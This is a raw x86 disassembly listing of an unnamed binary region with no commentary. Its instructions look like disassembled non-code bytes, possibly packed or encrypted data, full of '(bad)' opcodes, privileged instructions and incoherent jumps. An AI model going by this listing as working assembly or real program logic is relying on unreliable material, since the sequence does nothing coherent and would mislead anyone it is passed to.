  40a4a3:	cmp    al,0x71
  40a4a5:	rcr    DWORD PTR [esi-0x3d6d50ec],cl
  40a4ab:	pop    ss
  40a4ac:	stc    
  40a4ad:	shr    BYTE PTR [ecx-0x21],cl
  40a4b0:	ja     0x40a4e3
  40a4b2:	sub    BYTE PTR ds:0x8637f16b,0xbd
  40a4b9:	aam    0xfe
  40a4bb:	jo     0x40a536
  40a4bd:	rcl    BYTE PTR [eax],cl
  40a4bf:	retf   
  40a4c0:	into   
  40a4c1:	bound  ecx,QWORD PTR [esi]
  40a4c3:	sbb    ebp,ebx
  40a4c5:	hlt    
  40a4c6:	stc    
  40a4c7:	not    BYTE PTR [esi-0x248d6a54]
  40a4cd:	dec    eax
  40a4ce:	aaa    
  40a4cf:	push   0xffffffa9
  40a4d1:	mov    esp,0xf7bc1d38
  40a4d6:	adc    dl,BYTE PTR [esi+eiz*8]
  40a4d9:	add    bl,0xa0
  40a4dc:	mov    ebp,edx
  40a4de:	call   ecx
  40a4e0:	das    
  40a4e1:	lds    edi,FWORD PTR [edi]
  40a4e3:	js     0x40a4ff
  40a4e5:	xor    eax,0x78eb631e
  40a4ea:	popf   
  40a4eb:	ins    BYTE PTR es:[edi],dx
  40a4ec:	push   ecx
  40a4ed:	inc    ecx
  40a4ee:	inc    esp
  40a4ef:	mov    dh,0x62
  40a4f1:	sub    edi,esp
  40a4f3:	push   es
  40a4f4:	push   edi
  40a4f5:	mov    bl,0x9c
  40a4f7:	and    bh,bl
  40a4f9:	jg     0x40a52b
  40a4fb:	adc    BYTE PTR [ebx-0x7fabcb07],dl
  40a501:	and    DWORD PTR [edx+0x47ee894c],edi
  40a507:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a509:	sub    al,0x64
  40a50b:	or     eax,DWORD PTR [ebp+0x13]
  40a50e:	jbe    0x40a525
  40a510:	lahf   
  40a511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a512:	repz out 0x3d,al
  40a515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a516:	xchg   ebp,eax
  40a517:	scas   eax,DWORD PTR es:[edi]
  40a518:	addr16 mov eax,0x5125ab67
  40a51e:	sahf   
  40a51f:	fistp  DWORD PTR [esi+0x3c9d01ab]
  40a525:	add    edx,DWORD PTR [eax]
  40a527:	push   ds
  40a528:	mov    ?,WORD PTR [ecx-0x36]
  40a52b:	mov    esi,DWORD PTR [ebx]
  40a52d:	or     BYTE PTR [edx-0x12],cl
  40a530:	int3   
  40a531:	ja     0x40a574
  40a533:	aas    
  40a534:	cld    
  40a535:	sbb    al,0xe3
  40a537:	arpl   WORD PTR [edx+0x453781e0],dx
  40a53d:	or     edx,0x5c
  40a540:	mov    BYTE PTR [edx+ecx*2+0x4],ah
  40a544:	pmaxsw mm5,mm2
  40a547:	jo     0x40a4ff
  40a549:	and    al,0xb2
  40a54b:	pop    ebx
  40a54c:	fadd   QWORD PTR [edx]
  40a54e:	sar    BYTE PTR [ecx+ecx*4],0xc1
  40a552:	ret    0x1a30
  40a555:	sbb    eax,0x43a8306a
  40a55a:	and    al,0x74
  40a55c:	(bad)
  40a55f:	jecxz  0x40a52c
  40a561:	mov    eax,ds:0xc093b5ae
  40a566:	dec    ebx
  40a567:	sar    DWORD PTR [ebx+0x54],cl
  40a56a:	out    0x66,al
  40a56c:	mov    eax,0x58c821bc
  40a571:	inc    edi
  40a572:	repnz mov edi,0xf1f10409
  40a578:	push   esi
  40a579:	inc    edi
  40a57a:	ret    
  40a57b:	in     eax,0xdd
  40a57d:	repz imul ecx,DWORD PTR [esi+0x45],0x2
  40a582:	mov    bl,0x19
  40a584:	ja     0x40a573
  40a586:	xor    bh,BYTE PTR [eax+0x61]
  40a589:	loope  0x40a5ae
  40a58b:	jne    0x40a5c3
  40a58d:	and    al,0x29
  40a58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a590:	popf   
  40a591:	in     al,dx
  40a592:	outs   dx,DWORD PTR ds:[esi]
  40a593:	sahf   
  40a594:	fsincos 
  40a596:	jno    0x40a5f7
  40a598:	push   eax
  40a599:	mov    dl,0xe3
  40a59b:	push   edx
  40a59c:	imul   eax,DWORD PTR [edx+0x6d],0xf8519d70
  40a5a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a4:	push   ebp
  40a5a5:	xchg   esi,eax
  40a5a6:	pop    ebx
  40a5a7:	clc    
  40a5a8:	sbb    al,0x1e
  40a5aa:	scas   eax,DWORD PTR es:[edi]
  40a5ab:	adc    al,0x92
  40a5ad:	ret    0x6542
  40a5b0:	xchg   esi,eax
  40a5b1:	pop    ebp
  40a5b2:	sub    ecx,DWORD PTR [edi-0x5b]
  40a5b5:	shr    bl,1
  40a5b7:	adc    al,0x54
  40a5b9:	hlt    
  40a5ba:	add    eax,0xc776f7e7
  40a5bf:	jns    0x40a5fa
  40a5c1:	or     ebp,DWORD PTR [edi+0x621dafbb]
  40a5c7:	scas   eax,DWORD PTR es:[edi]
  40a5c8:	mov    BYTE PTR [edi+0x18c74b61],ch
  40a5ce:	or     BYTE PTR [ebp-0x5fc8aa9f],al
  40a5d4:	xor    eax,0x252cefad
  40a5d9:	shr    BYTE PTR [edi+0x37],cl
  40a5dc:	or     al,0x37
  40a5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5df:	div    BYTE PTR [ebp-0x2beec1c6]
  40a5e5:	sahf   
  40a5e6:	cmp    dh,BYTE PTR [edi]
  40a5e8:	jbe    0x40a571
  40a5ea:	sbb    eax,0xdc9cdcbd
  40a5ef:	call   DWORD PTR [edx]
  40a5f1:	mov    ebp,0x42849f3
  40a5f6:	xchg   DWORD PTR [edx-0x38],ebp
  40a5f9:	and    eax,0x57c455d5
  40a5fe:	ficomp WORD PTR [edx-0x1f]
  40a601:	adc    edx,DWORD PTR [eax-0x20]
  40a604:	xchg   edi,eax
  40a605:	xor    BYTE PTR [ecx],al
  40a607:	sbb    al,0xbe
  40a609:	pop    ds
  40a60a:	(bad)  
  40a60b:	repnz xchg edx,eax
  40a60d:	cli    
  40a60e:	imul   esp,DWORD PTR [edi-0x79ae16ba],0xd751c219
  40a618:	push   ecx
  40a619:	out    0x58,eax
  40a61b:	mov    bh,0xb2
  40a61d:	cdq    
  40a61e:	ficom  DWORD PTR [edx+0x2d3833fc]
  40a624:	mov    ds:0xc811c4ca,al
  40a629:	inc    ebx
  40a62a:	mov    ebp,0x40768f6
  40a62f:	pop    ebx
  40a630:	inc    ebp
  40a631:	leave  
  40a632:	jmp    0xdd3b5bfa
  40a637:	lahf   
  40a638:	jno    0x40a694
  40a63a:	sub    BYTE PTR [eax],ah
  40a63c:	sbb    ah,BYTE PTR [ebp-0x5450b4c0]
  40a642:	bound  ebp,QWORD PTR [edx-0x72b37427]
  40a648:	fs js  0x40a5f7
  40a64b:	test   eax,0x3faded17
  40a650:	jb     0x40a6c2
  40a652:	ror    ah,0x22
  40a655:	popa   
  40a656:	into   
  40a657:	xchg   esi,eax
  40a658:	and    ebp,DWORD PTR [ecx]
  40a65a:	stos   BYTE PTR es:[edi],al
  40a65b:	lahf   
  40a65c:	or     BYTE PTR [ebx],al
  40a65e:	pop    ebx
  40a65f:	(bad)  
  40a660:	jmp    0x98a1:0x9131045a
  40a667:	loop   0x40a6ca
  40a669:	xchg   esp,eax
  40a66a:	inc    eax
  40a66b:	mov    dh,0xbc
  40a66d:	sbb    esi,ecx
  40a66f:	pop    edi
  40a670:	cmp    ebp,esp
  40a672:	mov    cl,0x27
  40a674:	push   esp
  40a675:	jle    0x40a658
  40a677:	jns    0x40a643
  40a679:	dec    eax
  40a67a:	inc    edx
  40a67b:	dec    ebx
  40a67c:	mov    edx,0x462036d0
  40a681:	je     0x40a6ed
  40a683:	adc    BYTE PTR [eax-0xfe9e9ea],al
  40a689:	jg     0x40a613
  40a68b:	add    ebp,edi
  40a68d:	nop
  40a68e:	adc    DWORD PTR [edx+0x2],ebp
  40a691:	into   
  40a692:	dec    edi
  40a693:	lods   eax,DWORD PTR ds:[esi]
  40a694:	outs   dx,DWORD PTR ds:[esi]
  40a695:	pop    ecx
  40a696:	mov    al,0x19
  40a698:	ins    BYTE PTR es:[edi],dx
  40a699:	aas    
  40a69a:	mov    ds:0x989a1ab3,eax
  40a69f:	mov    ?,WORD PTR [edx+ebp*2]
  40a6a2:	sbb    eax,0x24dcee24
  40a6a7:	jb     0x40a6d7
  40a6a9:	mov    ds:0xce3c9b50,eax
  40a6ae:	outs   dx,BYTE PTR ds:[esi]
  40a6af:	aam    0xe6
  40a6b1:	fst    QWORD PTR ds:0x58b7b992
  40a6b7:	sbb    eax,edi
  40a6b9:	lods   al,BYTE PTR ds:[esi]
  40a6ba:	repnz cmp eax,0xb613cb59
  40a6c0:	(bad)  
  40a6c1:	lock iret 
  40a6c3:	dec    ebp
  40a6c4:	pop    eax
  40a6c5:	or     bl,dl
  40a6c7:	lods   al,BYTE PTR ds:[esi]
  40a6c8:	sub    dl,BYTE PTR [esi-0x545004f0]
  40a6ce:	(bad)  
  40a6cf:	rcl    BYTE PTR [edx+0x54f8c34],cl
  40a6d5:	sub    edx,esi
  40a6d7:	cld    
  40a6d8:	inc    BYTE PTR [esi-0x5a]
  40a6db:	inc    ebx
  40a6dc:	mov    ebx,0x91729479
  40a6e1:	pop    ds
  40a6e2:	clc    
  40a6e3:	cmp    eax,0xfdb6b641
  40a6e8:	shl    DWORD PTR [eax+edx*1-0xa],1
  40a6ec:	jbe    0x40a757
  40a6ee:	push   esi
  40a6ef:	jmp    0x2ff559cc
  40a6f4:	(bad)  
  40a6f5:	ficomp WORD PTR [esi]
  40a6f7:	dec    ebp
  40a6f8:	mov    eax,0x19fcf0cb
  40a6fd:	inc    esp
  40a6fe:	in     al,0xe9
  40a700:	mov    dl,BYTE PTR [edi-0x6ffc856e]
  40a706:	jp     0x40a713
  40a708:	shl    ah,0x46
  40a70b:	outs   dx,BYTE PTR ds:[esi]
  40a70c:	popa   
  40a70d:	test   bh,ah
  40a70f:	and    al,al
  40a711:	js     0x40a76b
  40a713:	bound  ebx,QWORD PTR [edi+0xc]
  40a716:	inc    ebx
  40a717:	inc    edi
  40a718:	(bad)
  40a71b:	xchg   edi,eax
  40a71c:	mov    ds:0x49cdee7,eax
  40a721:	stos   DWORD PTR es:[edi],eax
  40a722:	inc    edi
  40a723:	outs   dx,DWORD PTR ds:[esi]
  40a724:	stos   DWORD PTR es:[edi],eax
  40a725:	push   cs
  40a726:	mov    edi,0x48a06ded
  40a72b:	and    bl,al
  40a72d:	loope  0x40a6ee
  40a72f:	sbb    bh,dl
  40a731:	cmc    
  40a732:	mov    ah,ah
  40a734:	xor    DWORD PTR [eax],esi
  40a736:	loopne 0x40a75f
  40a738:	cli    
  40a739:	push   ss
  40a73a:	mov    edx,0x244bdbc1
  40a73f:	leave  
  40a740:	mov    ch,BYTE PTR [edx+0x48]
  40a743:	push   edi
  40a744:	test   DWORD PTR [ecx+0x7d5cc2a2],0x9c490ea3
  40a74e:	gs push ebx
  40a750:	and    DWORD PTR [edx-0x39],ebp
  40a753:	in     al,0x25
  40a755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a756:	fdivr  st(6),st
  40a758:	ins    DWORD PTR es:[edi],dx
  40a759:	and    ah,bl
  40a75b:	stos   DWORD PTR es:[edi],eax
  40a75c:	fild   DWORD PTR [esp+ebx*2+0x176f988]
  40a763:	shr    DWORD PTR [ebx],0xc6
  40a766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a767:	and    DWORD PTR [esi+0x31],ecx
  40a76a:	mov    ds:0xcdf69513,eax
  40a76f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a770:	test   BYTE PTR [ebx+0x46231c13],ch
  40a776:	sub    edi,DWORD PTR [esi-0x691e5cdc]
  40a77c:	gs dec ecx
  40a77e:	out    dx,eax
  40a77f:	dec    esi
  40a780:	fst    DWORD PTR [edx]
  40a782:	mul    dh
  40a784:	imul   ebp,ecx,0xffffffe5
  40a787:	loopne 0x40a725
  40a789:	enter  0x4efd,0x5f
  40a78d:	nop
  40a78e:	cmp    al,0x73
  40a790:	fdivp  st(4),st
  40a792:	repz popa 
  40a794:	aam    0xb5
  40a796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a797:	dec    ecx
  40a798:	fld    st(3)
  40a79a:	ret    0xfa8b
  40a79d:	ds in  al,0xdd
  40a7a0:	repnz rol DWORD PTR [eax+0x522721b3],cl
  40a7a7:	adc    eax,0xfe8944b0
  40a7ac:	mov    bh,0xa7
  40a7ae:	xor    al,0x5f
  40a7b0:	jno    0x40a798
  40a7b2:	scas   al,BYTE PTR es:[edi]
  40a7b3:	push   ebx
  40a7b4:	jg     0x40a7cd
  40a7b6:	sub    eax,0x675ce6e3
  40a7bb:	int    0x69
  40a7bd:	push   0xffffffe3
  40a7bf:	push   es
  40a7c0:	push   0xffffffb6
  40a7c2:	test   al,0x65
  40a7c5:	adc    eax,0xb45a78a4
  40a7ca:	in     eax,dx
  40a7cb:	nop
  40a7cc:	outs   dx,DWORD PTR ds:[esi]
  40a7cd:	into   
  40a7ce:	dec    esp
  40a7cf:	ror    BYTE PTR [edi],1
  40a7d1:	jecxz  0x40a7fe
  40a7d3:	and    bl,BYTE PTR ds:0xc5a3a21a
  40a7d9:	scas   eax,DWORD PTR es:[edi]
  40a7da:	and    eax,DWORD PTR [esp+edi*2-0xdc01d4]
  40a7e1:	not    bl
  40a7e3:	ret    
  40a7e4:	add    BYTE PTR [ebx+0x98e1486],bh
  40a7ea:	adc    BYTE PTR [ecx-0x1c9aef3f],cl
  40a7f0:	js     0x40a86f
  40a7f2:	in     eax,0x9f
  40a7f4:	dec    esi
  40a7f5:	loope  0x40a819
  40a7f7:	dec    eax
  40a7f8:	jle    0x40a879
  40a7fa:	xchg   ebx,eax
  40a7fb:	xor    dh,0x53
  40a7fe:	bound  eax,QWORD PTR [edx]
  40a800:	shl    bh,cl
  40a802:	jge    0x40a881
  40a804:	adc    eax,0x9a4acbbf
  40a809:	fadd   QWORD PTR [eax-0x63]
  40a80c:	pop    esp
  40a80d:	xchg   DWORD PTR [edx-0x5b],edi
  40a810:	neg    ebp
  40a812:	test   eax,0xb9cb9db0
  40a817:	push   edi
  40a818:	ret    0xaafc
  40a81b:	out    0xb0,eax
  40a81d:	lods   al,BYTE PTR ds:[esi]
  40a81e:	aad    0x97
  40a820:	fst    QWORD PTR [esi-0x5670e277]
  40a826:	push   esp
  40a827:	dec    eax
  40a828:	scas   al,BYTE PTR es:[edi]
  40a829:	push   ecx
  40a82a:	fisubr WORD PTR [ecx+0xf]
  40a82d:	inc    esi
  40a82e:	xor    ah,BYTE PTR [esi]
  40a830:	push   ebp
  40a831:	(bad)  
  40a832:	stc    
  40a833:	cmc    
  40a834:	dec    cl
  40a836:	lds    esi,FWORD PTR [ebx]
  40a838:	lds    ecx,FWORD PTR [ecx]
  40a83a:	ins    DWORD PTR es:[edi],dx
  40a83b:	fadd   DWORD PTR [ebx]
  40a83d:	pop    esp
  40a83e:	sar    DWORD PTR [edx],1
  40a840:	outs   dx,DWORD PTR ds:[esi]
  40a841:	sbb    eax,0x18a71d67
  40a846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a847:	in     eax,dx
  40a848:	sbb    al,0xb9
  40a84a:	bswap  ebx
  40a84c:	lea    ebp,[ebx+0x179fa65a]
  40a852:	in     eax,0x51
  40a854:	sbb    DWORD PTR [esi],edx
  40a856:	mov    cs,WORD PTR [edx-0x3451d38c]
  40a85c:	sub    al,BYTE PTR [esi-0x74]
  40a85f:	mov    BYTE PTR [ebx-0x42c06d43],dh
  40a865:	add    ebp,DWORD PTR [ebx+eiz*1]
  40a868:	xchg   edx,eax
  40a869:	pop    ecx
  40a86a:	jg     0x40a8bc
  40a86c:	imul   esi,DWORD PTR ds:0x9e9455c1,0x561ccf22
  40a876:	pop    ebp
  40a877:	retf   0xf843
  40a87a:	(bad)
  40a87e:	aad    0x35
  40a880:	in     al,dx
  40a881:	xor    DWORD PTR [edx-0x78284d67],eax
  40a887:	dec    esp
  40a888:	lock (bad) 
  40a88a:	sbb    BYTE PTR [ecx],bh
  40a88c:	addr16 jg 0x40a8c3
  40a88f:	mov    WORD PTR [esi],gs
  40a891:	mov    edi,DWORD PTR [ecx-0x3c]
  40a894:	jmp    0xc199:0xe3b9c110
  40a89b:	adc    esp,DWORD PTR [eax-0x1c]
  40a89e:	sbb    eax,0xb18ff2ba
  40a8a3:	jae    0x40a894
  40a8a5:	adc    edx,DWORD PTR [ebx]
  40a8a7:	call   FWORD PTR [ebx+ebx*2+0x1d]
  40a8ab:	imul   eax,eax,0x4129079e
  40a8b1:	shl    DWORD PTR [edi],1
  40a8b3:	rol    edi,0x5
  40a8b6:	sub    DWORD PTR [edi+0x3f9b4913],ebp
  40a8bc:	clc    
  40a8bd:	sub    ecx,DWORD PTR [edx]
  40a8bf:	pop    ss
  40a8c0:	jge    0x40a89b
  40a8c2:	mov    bl,0xf5
  40a8c4:	mov    bh,0xce
  40a8c6:	repnz fcmovu st,st(3)
  40a8c9:	or     esi,DWORD PTR [edx+0x57]
  40a8cc:	dec    esi
  40a8cd:	mov    eax,0x36ba5a40
  40a8d2:	gs pop edi
  40a8d4:	mov    dh,0x4f
  40a8d6:	push   0x57
  40a8d8:	arpl   bx,cx
  40a8da:	outs   dx,BYTE PTR ds:[esi]
  40a8db:	jecxz  0x40a8bc
  40a8dd:	and    eax,0x9bfab293
  40a8e2:	repz add DWORD PTR [ebp+0x6382b3fa],edi
  40a8e9:	dec    ecx
  40a8ea:	imul   ebx,DWORD PTR [edi+0x60],0xfffffffd
  40a8ee:	cmp    cl,BYTE PTR [edi+0x6d480c06]
  40a8f4:	jne    0x40a96c
  40a8f6:	shl    BYTE PTR [bx+di-0x24bc],1
  40a8fb:	push   0xffffffc9
  40a8fd:	(bad)  
  40a8ff:	iret   
  40a900:	jge    0x40a8bd
  40a902:	xor    DWORD PTR [ebp+0x242dd231],ebp
  40a908:	and    al,0x59
  40a90a:	(bad)  
  40a90b:	inc    DWORD PTR [ecx-0x7613e16f]
  40a911:	addr16 sbb bh,ch
  40a914:	loopne 0x40a92d
  40a916:	xchg   DWORD PTR ds:0x441fdda6,eax
  40a91c:	push   edi
  40a91d:	add    eax,edx
  40a91f:	sbb    dl,BYTE PTR [eax+0x16]
  40a922:	ins    BYTE PTR es:[edi],dx
  40a923:	cdq    
  40a924:	xor    al,0x2e
  40a926:	cmp    al,0xce
  40a928:	test   dl,ah
  40a92a:	ds push eax
  40a92c:	js     0x40a940
  40a92e:	mov    ah,0xa6
  40a930:	push   eax
  40a931:	mov    al,0x61
  40a933:	leave  
  40a934:	pushf  
  40a935:	sti    
  40a936:	mov    al,ds:0xc9bbf7c3
  40a93b:	jle    0x40a982
  40a93d:	les    edx,FWORD PTR [esi+0x70]
  40a940:	hlt    
  40a941:	and    al,0xd7
  40a943:	push   DWORD PTR [ebx+0xd]
  40a946:	cmp    ch,BYTE PTR [ebp-0x61]
  40a949:	les    eax,FWORD PTR [ebp-0x67]
  40a94c:	xchg   ecx,eax
  40a94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a94e:	lods   al,BYTE PTR ds:[esi]
  40a94f:	(bad)  
  40a950:	(bad)  [eax-0x19eda0b]
  40a956:	out    0x21,eax
  40a958:	mov    eax,DWORD PTR [esi+0x45]
  40a95b:	xchg   DWORD PTR [eax+0x69],ecx
  40a95e:	loopne 0x40a93c
  40a960:	jl     0x40a90e
  40a962:	sbb    edx,DWORD PTR [ebx-0x4b1716e]
  40a968:	sbb    BYTE PTR [edx+esi*1],bh
  40a96b:	(bad)  
  40a96d:	ds loope 0x40a99e
  40a970:	fmul   DWORD PTR [ebx+0x62a9788]
  40a976:	cmp    ebx,DWORD PTR [ecx+ecx*8-0x774b3d13]
  40a97d:	cs adc ebx,eax
  40a980:	retf   0xbb20
  40a983:	je     0x40a9aa
  40a985:	push   ebp
  40a986:	retf   
  40a987:	add    DWORD PTR [esi+eax*4-0x79],0xddaf82c7
  40a98f:	mov    dh,0x26
  40a991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a993:	sar    BYTE PTR ds:0xd46a1f5d,0x79
  40a99a:	icebp  
  40a99b:	cmp    BYTE PTR [ecx+0x24],ah
  40a99e:	call   0x72b281eb
  40a9a3:	test   DWORD PTR [eax+esi*1-0x4b871ff4],eax
  40a9aa:	rcr    DWORD PTR [ecx+esi*4+0xe],cl
  40a9ae:	xchg   ecx,eax
  40a9af:	in     al,dx
  40a9b0:	jmp    0xfe63e530
  40a9b5:	push   edx
  40a9b6:	push   cs
  40a9b7:	ret    
  40a9b8:	inc    edx
  40a9b9:	int3   
  40a9ba:	pop    ecx
  40a9bb:	fbld   TBYTE PTR [ebp+0x62]
  40a9be:	std    
  40a9bf:	sbb    eax,0xc27eda10
  40a9c4:	mov    dh,0xe2
  40a9c6:	push   ebx
  40a9c7:	int    0x3
  40a9c9:	jmp    0xded3:0x282f5a15
  40a9d0:	data16 cmp bh,ah
  40a9d3:	pop    ecx
  40a9d4:	and    eax,0x155f835c
  40a9d9:	inc    dl
  40a9db:	push   ds
  40a9dc:	add    eax,0xfbf6302b
  40a9e1:	and    DWORD PTR [esi+edi*2-0x3b],ecx
  40a9e5:	adc    dl,BYTE PTR [ebp-0x6]
  40a9e8:	xor    DWORD PTR [ebx],ebp
  40a9ea:	dec    edx
  40a9eb:	lods   eax,DWORD PTR ds:[esi]
  40a9ec:	or     al,0xdf
  40a9ee:	outs   dx,BYTE PTR ds:[esi]
  40a9ef:	push   ebp
  40a9f0:	neg    BYTE PTR [edi-0x25]
  40a9f3:	test   BYTE PTR [edx+0xf],cl
  40a9f6:	pop    edi
  40a9f7:	mov    cl,0x3b
  40a9f9:	xchg   ebp,eax
  40a9fa:	addr16 dec edx
  40a9fc:	out    0x5d,eax
  40a9fe:	out    0xa,eax
  40aa00:	cmp    ebx,DWORD PTR [edx+0xa981465]
  40aa06:	call   0xac25:0x968ec8a6
  40aa0d:	pop    ds
  40aa0e:	nop
  40aa0f:	lods   eax,DWORD PTR ds:[esi]
  40aa10:	sub    dh,BYTE PTR [edx]
  40aa12:	inc    ebx
  40aa13:	sbb    bh,BYTE PTR [eax-0x6875951d]
  40aa19:	xor    eax,ebx
  40aa1b:	xor    eax,0xe30100d
  40aa20:	(bad)  
  40aa21:	ja     0x40aa94
  40aa23:	pop    es
  40aa24:	leave  
  40aa25:	sub    cl,BYTE PTR [esi]
  40aa27:	mov    esp,0xe9002d40
  40aa2c:	xchg   ecx,eax
  40aa2d:	pop    eax
  40aa2e:	aas    
  40aa2f:	push   esp
  40aa30:	mov    BYTE PTR [ebx+0x72fcf2e1],ah
  40aa36:	ins    DWORD PTR es:[edi],dx
  40aa37:	or     bl,BYTE PTR [ebx+ebp*2]
  40aa3a:	xor    esi,DWORD PTR [edi+0x27022819]
  40aa40:	mov    fs,ecx
  40aa42:	pmuludq mm4,QWORD PTR [esi]
  40aa45:	in     al,0x87
  40aa47:	rol    BYTE PTR [edx],cl
  40aa49:	repnz or ebp,ebp
  40aa4c:	push   ebx
  40aa4d:	mov    eax,0xcce1a17d
  40aa52:	stos   BYTE PTR es:[edi],al
  40aa53:	lods   eax,DWORD PTR ds:[esi]
  40aa54:	cwde   
  40aa55:	and    edx,0x15c3c0cf
  40aa5b:	push   ebx
  40aa5c:	jl     0x40aa8a
  40aa5e:	fwait
  40aa5f:	call   0xd353:0xe8536f60
  40aa66:	(bad)  
  40aa68:	push   edi
  40aa69:	sar    BYTE PTR [ebx],cl
  40aa6b:	mov    eax,DWORD PTR [edx+0x52]
  40aa6e:	mov    bh,0xab
  40aa70:	sbb    ebp,DWORD PTR [edi+0xb]
  40aa73:	adc    eax,0x3c407445
  40aa78:	daa    
  40aa79:	ret    0x646e
  40aa7c:	adc    bh,BYTE PTR ds:0x49525920
  40aa82:	cmp    BYTE PTR ss:[esi+esi*8+0x58],0x75
  40aa88:	sub    eax,DWORD PTR [eax-0x6208823f]
  40aa8e:	clc    
  40aa8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa90:	pop    ecx
  40aa91:	mov    al,ds:0x539b851e
  40aa96:	ds in  eax,0x3e
  40aa99:	cwde   
  40aa9a:	aaa    
  40aa9b:	mov    WORD PTR [si-0x57],?
  40aa9f:	push   esi
  40aaa0:	es inc eax
  40aaa2:	icebp  
  40aaa3:	dec    DWORD PTR [edi]
  40aaa5:	jo     0x40aa69
  40aaa7:	mov    eax,0x1ccd98fa
  40aaac:	out    0x55,al
  40aaae:	xchg   BYTE PTR [eax-0x5a],bl
  40aab1:	int    0x6
  40aab3:	cli    
  40aab4:	jo     0x40aa94
  40aab6:	addr16 aam 0x78
  40aab9:	(bad)  
  40aaba:	idiv   DWORD PTR [ecx-0x391e13b6]
  40aac0:	push   es
  40aac1:	ds mov ebp,0x8b2396d8
  40aac7:	scas   al,BYTE PTR es:[edi]
  40aac8:	gs xchg ebx,eax
  40aaca:	jp     0x40aa6a
  40aacc:	jbe    0x40aa7e
  40aace:	loope  0x40aa65
  40aad0:	push   eax
  40aad1:	(bad)  
  40aad2:	mov    WORD PTR [ebp-0x7ed1e8a3],cs
  40aad8:	xchg   esi,eax
  40aad9:	imul   esi,edi,0x45a564a4
  40aadf:	mov    edx,esp
  40aae1:	xchg   edi,eax
  40aae2:	xor    al,0x8f
  40aae4:	xchg   ecx,eax
  40aae5:	in     eax,dx
  40aae6:	lahf   
  40aae7:	mov    bh,bh
  40aae9:	loope  0x40aae6
  40aaeb:	enter  0xbe1a,0xf9
  40aaef:	(bad)  
  40aaf1:	cmp    al,0x79
  40aaf3:	inc    eax
  40aaf4:	outs   dx,BYTE PTR ds:[esi]
  40aaf5:	xor    BYTE PTR [ebx+ebx*4+0x209c233f],cl
  40aafc:	fldenv [ebx+0x1ddd38e3]
  40ab02:	add    ah,ah
  40ab04:	sbb    al,0xd6
  40ab06:	jmp    0x40aac2
  40ab08:	out    0xd3,eax
  40ab0a:	mov    esp,0x47bd4102
  40ab0f:	lods   eax,DWORD PTR ds:[esi]
  40ab10:	push   cs
  40ab11:	mov    edi,0xbc93a0db
  40ab16:	daa    
  40ab17:	icebp  
  40ab18:	push   edx
  40ab19:	aad    0x11
  40ab1b:	adc    DWORD PTR [edi],esi
  40ab1d:	repz ss adc DWORD PTR ds:[esi+eax*1+0x302d3354],ebx
  40ab27:	push   ss
  40ab28:	xchg   ebx,eax
  40ab29:	xchg   esp,eax
  40ab2a:	bound  edx,QWORD PTR [edi+0x37c1ed7a]
  40ab30:	test   al,0xbf
  40ab32:	xor    ebp,edi
  40ab34:	inc    edi
  40ab35:	mov    ebp,0xf90332ed
  40ab3a:	or     al,0x31
  40ab3c:	xchg   esp,eax
  40ab3d:	test   BYTE PTR [esi-0x269684af],0xda
  40ab44:	jg     0x40ab28
  40ab46:	push   ds
  40ab47:	adc    eax,0xf6521703
  40ab4c:	int3   
  40ab4d:	and    BYTE PTR [ebx+0x3242f417],ah
  40ab53:	push   ss
  40ab54:	pop    ds
  40ab55:	repz push cs
  40ab57:	arpl   dx,bx
  40ab59:	ret    
  40ab5a:	mov    al,ds:0x858c295
  40ab5f:	dec    edx
  40ab60:	fsubr  DWORD PTR [ecx-0x4e]
  40ab63:	out    0x32,eax
  40ab65:	ja     0x40ab92
  40ab67:	inc    eax
  40ab68:	mul    dl
  40ab6a:	rcr    BYTE PTR [edi-0x5226b8b],cl
  40ab70:	sar    ah,cl
  40ab72:	add    BYTE PTR [edi+edx*8],cl
  40ab75:	push   cs
  40ab76:	iret   
  40ab77:	sub    edi,ebx
  40ab79:	mov    ss,WORD PTR [ecx-0x2c]
  40ab7c:	stos   BYTE PTR es:[edi],al
  40ab7d:	std    
  40ab7e:	mov    gs,WORD PTR [esp+esi*8]
  40ab81:	add    DWORD PTR [edx-0x26],esp
  40ab84:	fsub   QWORD PTR [edx]
  40ab87:	mov    eax,0xb1fbd6
  40ab8c:	stc    
  40ab8d:	mov    dl,0x8a
  40ab8f:	lods   eax,DWORD PTR ds:[esi]
  40ab90:	sub    eax,ebp
  40ab92:	out    0xff,eax
  40ab94:	nop
  40ab95:	lods   eax,DWORD PTR ds:[esi]
  40ab96:	imul   DWORD PTR [edi+0x5c]
  40ab99:	add    edx,DWORD PTR [ebx+0x5846cba2]
  40ab9f:	(bad)  
  40aba0:	jmp    DWORD PTR [ecx-0x7a1549e4]
  40aba6:	arpl   WORD PTR [ebp+0x6d],bx
  40aba9:	xlat   BYTE PTR ds:[ebx]
  40abaa:	lea    esi,[esi]
  40abac:	xchg   ecx,eax
  40abad:	(bad)  
  40abae:	jbe    0x40ab8a
  40abb0:	push   cs
  40abb1:	or     DWORD PTR [eax],ebx
  40abb3:	xor    esi,edi
  40abb5:	pop    ss
  40abb6:	mov    bh,0xb
  40abb8:	inc    ebx
  40abb9:	sbb    DWORD PTR [ecx],ebp
  40abbb:	or     cl,BYTE PTR [edx-0x43]
  40abbe:	sub    bl,BYTE PTR [ebx-0x758d8f1f]
  40abc4:	lahf   
  40abc5:	daa    
  40abc6:	ins    BYTE PTR es:[edi],dx
  40abc7:	lods   al,BYTE PTR ds:[esi]
  40abc8:	sub    ecx,ebx
  40abca:	push   edi
  40abcb:	xor    al,dl
  40abcd:	into   
  40abce:	sub    ecx,DWORD PTR [edx]
  40abd0:	add    dh,BYTE PTR [esi]
  40abd2:	mov    dl,0xce
